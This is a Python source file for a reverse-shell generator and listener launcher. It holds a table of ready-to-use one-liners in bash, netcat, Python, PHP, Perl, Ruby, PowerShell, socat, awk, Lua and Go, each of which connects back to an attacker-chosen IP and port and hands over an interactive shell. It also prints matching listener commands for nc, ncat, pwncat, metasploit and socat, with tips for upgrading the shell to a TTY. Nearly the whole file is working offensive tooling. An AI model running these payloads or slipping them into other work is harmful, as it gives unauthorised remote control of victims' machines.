"""
Reverse Shell Generator & Listener Launcher
Provides ready-to-use payloads for common post-exploitation scenarios.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Shell payload templates
# ---------------------------------------------------------------------------

_SHELLS: dict[str, str] = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash-196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    "bash-read": 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
    "nc": "nc -e /bin/sh {ip} {port}",
    "nc-mkfifo": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f",
    "nc-noe": "nc {ip} {port} | /bin/bash | nc {ip} {port}",
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python3": (
        "python3 -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);"
        "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "php-proc": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});"
        "$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i))))"
        "{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        "exec(\"/bin/sh -i\");}};'"
    ),
    "ruby": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port});"
        "[0,1,2].each{{|fd| IO.for_fd(fd).reopen(f)}};exec \"/bin/sh -i\"'"
    ),
    "powershell": (
        "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};$client.Close()"
    ),
    "powershell-b64": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command"
        " New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
    ),
    "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
    "socat-tty": "socat TCP:{ip}:{port} EXEC:bash,pty,stderr,setsid,sigint,sane",
    "awk": "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") }}}}'",
    "lua": "lua -e \"require('socket');require('os');t=socket.tcp();"
           "t:connect('{ip}','{port}');"
           "os.execute('/bin/sh -i <&3 >&3 2>&3')\"",
    "xterm": "xterm -display {ip}:0",
    "ncat": "ncat {ip} {port} -e /bin/bash",
    "ncat-ssl": "ncat --ssl {ip} {port} -e /bin/bash",
    "golang": (
        "echo 'package main;import\"os/exec\";import\"net\";"
        "func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");"
        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;"
        "cmd.Stderr=c;cmd.Run()}}' > /tmp/rs.go && go run /tmp/rs.go"
    ),
}

# Short one-line description for the listing table
_SHELL_NOTES: dict[str, str] = {
    "bash": "Bash /dev/tcp redirect",
    "bash-196": "Bash fd-196 variant",
    "bash-read": "Bash exec+read loop",
    "nc": "Netcat with -e flag",
    "nc-mkfifo": "Netcat via mkfifo (no -e)",
    "nc-noe": "Netcat double pipe",
    "python": "Python 2 socket",
    "python3": "Python 3 socket",
    "php": "PHP fsockopen",
    "php-proc": "PHP proc_open",
    "perl": "Perl socket",
    "ruby": "Ruby TCPSocket",
    "powershell": "PowerShell TCPClient (Windows)",
    "powershell-b64": "PowerShell one-liner (Windows)",
    "socat": "Socat exec bash",
    "socat-tty": "Socat full TTY",
    "awk": "AWK /inet/tcp",
    "lua": "Lua socket",
    "xterm": "X-Term display forwarding",
    "ncat": "Ncat (nmap variant)",
    "ncat-ssl": "Ncat SSL encrypted",
    "golang": "Go compiled in /tmp",
}


def list_reverse_shells() -> str:
    """
    Return a formatted table of all supported reverse-shell types.

    Returns:
        Formatted string listing every supported shell type.
    """
    lines = [
        "",
        "  ╔══════════════════════════════════════════════════════════════╗",
        "  ║              REVERSE SHELL TYPES                            ║",
        "  ╠══════════════╦═══════════════════════════════════════════════╣",
        "  ║ TYPE         ║ DESCRIPTION                                  ║",
        "  ╠══════════════╬═══════════════════════════════════════════════╣",
    ]
    for name, note in _SHELL_NOTES.items():
        lines.append(f"  ║ {name:<12} ║ {note:<45} ║")
    lines += [
        "  ╚══════════════╩═══════════════════════════════════════════════╝",
        "",
        "  Usage: shell <type> <your-ip> <port>",
        "  Example: shell bash 10.10.14.5 4444",
        "",
    ]
    return "\n".join(lines)


def generate_reverse_shell(shell_type: str, ip: str, port: int) -> str:
    """
    Generate a reverse-shell one-liner for the given type, IP, and port.

    Args:
        shell_type: Shell type name (see list_reverse_shells for options).
        ip: Your (attacker) IP address.
        port: Listening port on your machine.

    Returns:
        Ready-to-copy payload string, or an error message.
    """
    key = shell_type.lower().strip()
    template = _SHELLS.get(key)
    if not template:
        similar = [k for k in _SHELLS if k.startswith(key[:3])]
        hint = f"  Similar types: {', '.join(similar)}" if similar else ""
        return (
            f"Unknown shell type: '{shell_type}'\n"
            f"Run 'shell list' to see all available types.{hint}"
        )

    try:
        payload = template.format(ip=ip, port=port)
    except KeyError as exc:
        return f"Template error for '{shell_type}': {exc}"

    separator = "─" * max(len(payload), 60)
    return (
        f"\n  Shell type : {key}\n"
        f"  LHOST      : {ip}\n"
        f"  LPORT      : {port}\n"
        f"  {separator}\n"
        f"  {payload}\n"
        f"  {separator}\n"
        f"\n  Start listener first: listen {port}\n"
    )


def start_listener(port: int, listener_type: str = "nc") -> str:
    """
    Return the command to start a listener for catching a reverse shell.
    Does NOT execute anything — just prints the command(s) to run.

    Args:
        port: Port to listen on.
        listener_type: 'nc', 'ncat', 'ncat-ssl', or 'pwncat'.

    Returns:
        Formatted string with the listener command(s) and upgrade tips.
    """
    lt = listener_type.lower().strip()

    commands: dict[str, list[str]] = {
        "nc": [
            f"nc -lvnp {port}",
            "# Upgrade to TTY after catch:",
            "# python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "# Ctrl+Z → stty raw -echo; fg → export TERM=xterm",
        ],
        "ncat": [
            f"ncat -lvnp {port}",
            "# Upgrade: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        ],
        "ncat-ssl": [
            f"ncat --ssl -lvnp {port}",
            f"# Client must use: ncat --ssl {'{ATTACKER_IP}'} {port} -e /bin/bash",
        ],
        "pwncat": [
            f"pwncat-cs -lp {port}",
            "# pwncat auto-upgrades shell to full PTY",
            "# Install: pip install pwncat-cs",
        ],
        "metasploit": [
            f"msfconsole -q -x 'use multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; "
            f"set LHOST 0.0.0.0; set LPORT {port}; run'",
        ],
        "socat": [
            f"socat file:`tty`,raw,echo=0 tcp-listen:{port}",
            "# Provides full interactive TTY immediately",
        ],
    }

    cmds = commands.get(lt)
    if not cmds:
        available = ", ".join(commands.keys())
        return (
            f"Unknown listener type: '{listener_type}'\n"
            f"Available: {available}"
        )

    separator = "─" * 60
    lines = [
        "",
        f"  Listener type : {lt}",
        f"  Port          : {port}",
        f"  {separator}",
    ]
    for cmd in cmds:
        lines.append(f"  {cmd}")
    lines += [
        f"  {separator}",
        "",
    ]
    return "\n".join(lines)
